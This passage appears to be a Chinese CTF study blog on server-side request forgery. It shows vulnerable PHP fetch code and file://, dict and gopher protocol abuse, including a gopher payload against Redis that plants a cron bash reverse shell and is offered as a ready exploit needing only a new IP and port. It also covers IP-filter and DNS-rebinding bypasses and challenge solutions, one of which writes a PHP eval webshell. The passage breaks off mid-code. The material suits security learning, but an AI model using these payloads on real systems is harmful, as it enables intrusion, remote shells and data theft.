<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造?url=www.baidu.com能直接访问百度首页</p>
<p><strong>curl_exec()</strong></p>
<p>curl_init(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供 <code>curl_setopt()</code> <code>curl_exec()</code> <code>curl_close()</code> 函数使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">	<span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span></span><br><span class="line">	<span class="comment">// file_put_contents($filename, $result); </span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造?url=www.baidu.com能直接访问百度首页</p>
<h3 id="危险协议"><a href="#危险协议" class="headerlink" title="危险协议"></a>危险协议</h3><p><strong>file://</strong></p>
<p>file://后面跟路径可以访问任意文件：<code>file:///etc/passwd</code></p>
<p><strong>dict</strong></p>
<p><code>dict</code> 协议可探测目标端口的开放情况和指纹信息，帮助攻击者判断目标服务类型</p>
<p>利用 <code>dict</code> 协议，<code>dict://ip/info</code>可获取本地<code>redis</code>服务配置信息</p>
<p>配合curl进行<code>curl dict://ip:port</code> 根据返回信息判断目标服务是否为Redis等</p>
<p><strong>gopher协议</strong></p>
<p><code>Gopher</code> 协议是一种用于在网络上分发、搜索和检索文档的通信协议</p>
<p><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP 数据流&gt;</code>，其中 <code>&lt;host&gt;</code> 为服务器主机名或 IP 地址，<code>&lt;port&gt;</code> 为端口号，默认为 70，<code>&lt;gopher-path&gt;</code> 为资源路径</p>
<p>先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br><span class="line">//redis-cli查看所有的keys及清空所有的数据</span><br></pre></td></tr></table></figure>
<p>这便是常见的exp，<strong>只需自己更改IP和端口</strong>，改成适配于<code>Gopher</code>协议的 URL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0</span><br></pre></td></tr></table></figure>
<p>经过url解码便是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1 <span class="variable">$8</span> flushall *3 <span class="variable">$3</span> <span class="built_in">set</span> <span class="variable">$1</span> 1 <span class="variable">$64</span> */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 *4 <span class="variable">$6</span> config <span class="variable">$3</span> <span class="built_in">set</span> <span class="variable">$3</span> <span class="built_in">dir</span> <span class="variable">$16</span> /var/www/html/ *4 <span class="variable">$6</span> config <span class="variable">$3</span> <span class="built_in">set</span> <span class="variable">$10</span> dbfilename <span class="variable">$4</span> root *1 <span class="variable">$4</span> save quit</span><br></pre></td></tr></table></figure>
<p><strong>gopher协议发POST包</strong></p>
<p>类似源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//关闭错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//判断url参数是否存在</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//不存在就跳转到当前根目录</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化curl</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="comment">//指定请求的url</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="comment">//告诉curl不返回http头，只返回http正文</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//允许cURL跟随重定向。如果服务器响应包含重定向，cURL将自动处理。</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>
<p>在使用Gopher协议发送POST请求包时，HOST、Content-Type和Content-Length请求头是必不可少的，但是在GET请求中可以没有</p>
<p><strong>在向服务器发送请求时，首先浏览器会进行一次URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次解码</strong></p>
<p>我们自己进行第一次URL编码时，编码后要将里面<code>%0A</code>全部替换成<code>%0D0A</code>（因为<code>%0A</code>时ASCII中的换行符），替换完成后，再进行二次编码</p>
<p>最后构造请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher://127.0.0.1:80/二次编码的url</span><br></pre></td></tr></table></figure>
<h3 id="绕过-4"><a href="#绕过-4" class="headerlink" title="@绕过"></a>@绕过</h3><p>如果有些题目会检查必须包含一个地址，可以使用@绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com@1.1.1.1</span><br></pre></td></tr></table></figure>
<p>这样和<a target="_blank" rel="noopener" href="http://1.1.1.1的效果是一样的">http://1.1.1.1的效果是一样的</a></p>
<h3 id="用句号替换-“-”"><a href="#用句号替换-“-”" class="headerlink" title="用句号替换 “.”"></a>用句号替换 “.”</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1</span><br></pre></td></tr></table></figure>
<h3 id="xip-io-和-xip-name-绕过"><a href="#xip-io-和-xip-name-绕过" class="headerlink" title="xip.io 和 xip.name 绕过"></a>xip.io 和 xip.name 绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.xip.io # 解析到 10.0.0.1 </span><br><span class="line">10.0.0.1.xip.name # 解析到 10.0.0.1 </span><br></pre></td></tr></table></figure>
<h3 id="针对127-0-0-1的绕过"><a href="#针对127-0-0-1的绕过" class="headerlink" title="针对127.0.0.1的绕过"></a>针对127.0.0.1的绕过</h3><p><code>sudo.cc</code></p>
<p><code>url=http://0/flag.php</code>（host位数小于三）<br><code>url=http://127.1/flag.php</code><br><code>url=http://0x7f.0.0.1/flag.php</code><br><code>url=http://0177.0.0.1/flag.php</code></p>
<p><code>url=http://2130706433/flag.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># POST: url=http://your-domain/ssrf.php</span></span><br></pre></td></tr></table></figure>
<p>如果限制host小于5</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure>
<p><code>gethostbyname</code> 是一个简单且实用的函数，用于将主机名解析为 IP 地址</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>); <span class="comment">// 如果 IP 无效或属于私有或保留范围，终止脚本并输出 &#x27;ip!&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><strong><code>filter_var($ip, FILTER_VALIDATE_IP)</code></strong>:<ul>
<li>这个函数用于验证 <code>$ip</code> 是否是一个有效的 IP 地址（IPv4 或 IPv6）。</li>
</ul>
</li>
<li><strong><code>FILTER_FLAG_NO_PRIV_RANGE</code></strong>:<ul>
<li>这是一个过滤标志，表示 <code>filter_var</code> 应该拒绝私有 IP 地址。</li>
<li>私有 IP 地址范围包括：<ul>
<li><code>10.0.0.0 - 10.255.255.255</code></li>
<li><code>172.16.0.0 - 172.31.255.255</code></li>
<li><code>192.168.0.0 - 192.168.255.255</code></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>FILTER_FLAG_NO_RES_RANGE</code></strong>:<ul>
<li>这是一个过滤标志，表示 <code>filter_var</code> 应该拒绝保留 IP 地址。</li>
<li>保留 IP 地址范围包括：<ul>
<li><code>127.0.0.0 - 127.255.255.255</code> (本地回环地址)</li>
<li><code>169.254.0.0 - 169.254.255.255</code> (链路本地地址)</li>
<li>其他特殊用途的 IP 地址（如 <code>0.0.0.0</code> 等）</li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123;    </span><br><span class="line">echo file_get_contents($url); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_url</span>()  </span><br><span class="line">						 </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果-----------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//</span><br><span class="line">    [user] =&gt; username			@前</span><br><span class="line">    [pass] =&gt; password			@前</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?以后的key=value</span><br><span class="line">    [fragment] =&gt; anchor		#以后的部分</span><br><span class="line">)</span><br><span class="line">	/path</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>禁止了所有字母和<code>.</code>，那么我们使用2130706433来表示127.0.0.1</p>
<p>也可以生成短链接进行访问<a target="_blank" rel="noopener" href="https://app.bitly.com/bbt2/">Bitly. The power of the link.</a> </p>
<h3 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/572743280">(10 封私信 / 80 条消息) Web-SSRF-DNS重绑定 - 知乎</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sun010/articles/18837324">SSRF3-URL Bypass（ 如何绕过ssrf过滤<code>@</code>+302跳转+DNS 重绑定） - sun010 - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8300">DNS Rebinding Bypass SSRF-先知社区</a></p>
<h4 id="传统SSRF过滤"><a href="#传统SSRF过滤" class="headerlink" title="传统SSRF过滤"></a>传统SSRF过滤</h4><ol>
<li>获取到输入的URL，从该URL中提取host</li>
<li>对该host进行DNS解析，获取到解析的IP</li>
<li>检测该IP是否是合法的，比如是否是私有IP等</li>
<li>如果IP检测为合法的，则进入curl的阶段发包</li>
</ol>
<h4 id="Web浏览器同源策略-SOP"><a href="#Web浏览器同源策略-SOP" class="headerlink" title="Web浏览器同源策略(SOP)"></a>Web浏览器同源策略(SOP)</h4><p>同源策略（Same origin policy） 是一个重要的安全策略，它用于限制一个origin的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介（两个 URL 的协议、域名、端口都相同的话，则这两个 URL 是同源）</p>
<p>简单来说，在浏览器里，同一个域名下的网站只能访问本域名下的资源，就像我一个浏览器同时打开了多个网站，里面分别存有我的个人敏感信息，由于同源策略的存在，这几个网站不会相互访问，这就保护了我们的个人信息不会泄露到其它网站上去</p>
<p>但是在浏览器中，<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;link&gt;</code>等标签都可以跨域加载，而不受浏览器的同源策略的限制,，别担心！通过通过src属性加载的资源,浏览器限制了JavaScript的权限，使其不能读写src加载返回的内容</p>
<h4 id="DNS重绑定攻击"><a href="#DNS重绑定攻击" class="headerlink" title="DNS重绑定攻击"></a>DNS重绑定攻击</h4><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址，这里的攻击过程是基于传统SSRF过滤过程之中两次请求的时间差（host解析和curl发包之间），但对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的</p>
<p>发现了吧，浏览器只认为域名相同的即为同源，而不在乎DNS解析过后指向的IP地址，所以可以通过DNS重绑定攻击来绕过同源策略、攻击内网</p>
<p>借用一张图：</p>
<p><img src="/img/lazy.gif" data-original="ssrf2.png" alt=""></p>
<ol>
<li>攻击者配置了一台DNS服务器用于解析某域名</li>
<li>每次请求后返回的解析结果不一样，分别是一个合法地址，一个是恶意地址</li>
<li>当服务器在第一次请求的时候返回合法地址，第二次请求时返回的是恶意地址。就可以绕过限制进行利用</li>
</ol>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>可以尝试这个网站，它可以帮忙进行重绑定<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
<p>分别输入A：127.0.0.1 B：192.168.0.1</p>
<p>然后 <code>http://7f000001.c0a80001.rbndr.us/flag.php</code> 即可</p>
<p>如果是不是打127的话可以在A输入你VPS的ip，然后在B输入题目的docker.ip</p>
<p>再在自己的VPSweb服务下起一个重定向到127.0.0.1/flag.php也可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a><strong>例题</strong></h3><p>一些概念上的练习可以上ctfhub上的SSRF分支去练习</p>
<h4 id="攻防世界-难度5-babyweb（国赛）"><a href="#攻防世界-难度5-babyweb（国赛）" class="headerlink" title="攻防世界 难度5_babyweb（国赛）"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> 难度5_babyweb（国赛）</h4><p>看到内网访问，想到ssrf.php（这真是要对上脑电波的）</p>
<p>然后就是简单的访问<code>file:///flag</code></p>
<h4 id="攻防世界-难度5-ssrfme"><a href="#攻防世界-难度5-ssrfme" class="headerlink" title="攻防世界 难度5_ssrfme"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> 难度5_ssrfme</h4><p>验证码脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">cha = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = hashlib.md5(<span class="built_in">str</span>(cha).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> s[-<span class="number">6</span>:] == <span class="string">&#x27;412cfb&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(cha)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cha += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>然后对flag编码，访问 <code>file:///%66%6c%61%67</code>即可</p>
<h4 id="SDCTF-2022-CURL-Up-and-Read-NSSCTF"><a href="#SDCTF-2022-CURL-Up-and-Read-NSSCTF" class="headerlink" title="[SDCTF 2022]CURL Up and Read | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2355">[SDCTF 2022]CURL Up and Read | NSSCTF</a></h4><p>先尝试file:///flag，发现不行，然后尝试www.baidu.com，发现成功回显，然后看到URL有base64编码</p>
<p>尝试file:///proc/1/environ编码后替换访问，成功得到flag</p>
<h4 id="BUUCTF在线评测-SSRFME"><a href="#BUUCTF在线评测-SSRFME" class="headerlink" title="BUUCTF在线评测 SSRFME"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HITCON 2017]SSRFme">BUUCTF在线评测</a> SSRFME</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://c9f6fe87-ec4b-42d3-9b16-a372427cc0a0.node5.buuoj.cn:81/?url=data:text/plain,%27%3C?php%20@eval($_POST[%27capt%27])?%3E%27&amp;filename=upload/test.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://c9f6fe87-ec4b-42d3-9b16-a372427cc0a0.node5.buuoj.cn:81/sandbox/50d5f583d8a911dde39156ba3f03c3d5/upload/test.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>蚁剑连接即可</p>
<h4 id="NSSRound-20-Basic-CSDN-To-PDF-V1-2-NSSCTF"><a href="#NSSRound-20-Basic-CSDN-To-PDF-V1-2-NSSCTF" class="headerlink" title="NSSRound#20 Basic]CSDN_To_PDF V1.2 | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5308">NSSRound#20 Basic]CSDN_To_PDF V1.2 | NSSCTF</a></h4><p><strong>源码：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, make_response, render_template, flash, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> flask_weasyprint <span class="keyword">import</span> HTML, render_pdf</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">URL_REGEX = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&#x27;http(s)?://&#x27;</span>  <span class="comment"># http or https</span></span><br><span class="line">    <span class="string">r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> URL_REGEX.<span class="keyword">match</span>(url):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;blog.csdn.net&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CsdnToPdf</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        url = request.form.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        <span class="comment"># 当我不知道weasyprint会解析恶意 &lt;link attachment=xxx&gt;？</span></span><br><span class="line">        url = url.replace(<span class="string">&quot;html&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> is_valid_url(url):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                html = HTML(url=url)</span><br><span class="line">                pdf = html.write_pdf()</span><br><span class="line">                response = make_response(pdf)</span><br><span class="line">                response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/pdf&#x27;</span></span><br><span class="line">                response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=output.pdf&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&#x27;Error generating PDF&#x27;</span>, <span class="number">500</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;Invalid URL! Target web address: &#x27;</span> + url</span><br><span class="line">    <span 